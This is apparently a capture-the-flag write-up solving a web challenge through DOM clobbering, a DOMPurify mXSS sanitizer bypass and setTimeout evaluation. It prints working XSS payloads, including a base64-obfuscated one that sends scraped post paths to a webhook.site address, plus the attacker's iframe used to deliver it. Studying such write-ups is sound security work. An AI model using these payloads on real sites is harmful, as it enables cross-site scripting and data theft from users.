# Solution

You can exploit DOM clobbering to control the content of the `redirect_error_image` variable if it's used before `script.js` is loaded asynchronously.

You need to bypass the custom sanitification to allow an `a` tag with the `id` attribute.

This attack allows to bypass the custom sanitification https://research.securitum.com/dompurify-bypass-using-mxss/.

The `redirect_error_page` variable is used in the setTimeout called in the `onerror` handler of the image.

setTimeout evals the first input as js and give us XSS.

An example of payload is the following one

`<svg></p><style><a class="</style><a href=mailto:'a';alert(1) id=redirect_error_image >">`


To trigger this payload the `onerror` handler needs to be called before loading `script.js`.

It can be done by failing fast the image loading with an url like `http://localhost` and avoiding to use the cached version of `script.js`.

To avoid hitting the cache the page can be loaded in an iframe inside a document from a different origin.

# Payloads

The malicious post is created with `http://localhost` as url and the following description

`<svg></p><style><a class="</style><a href=mailto:'a';eval(atob('ZmV0Y2goJy9wb3N0JykudGhlbihyPT5yLnRleHQoKSkudGhlbih0PT57eD0vcG9zdFwvW1x3LV0qL2cuZXhlYyh0KTtmZXRjaCgnaHR0cHM6Ly93ZWJob29rLnNpdGUvZDQ4NWYxM2EtZmQ4Yi00Y2ZkLWFkMTMtNjNkOWIwZjFmNWVmLycreFswXSl9KS8v')) id=redirect_error_image >">`


Then, the post is embedded by a server controlled by the attacker

`<iframe src="https://lesn.m0lecon.fans/post/1bd9b0a4-36cf-468f-8dbc-c0a2e8d1303d"></iframe>`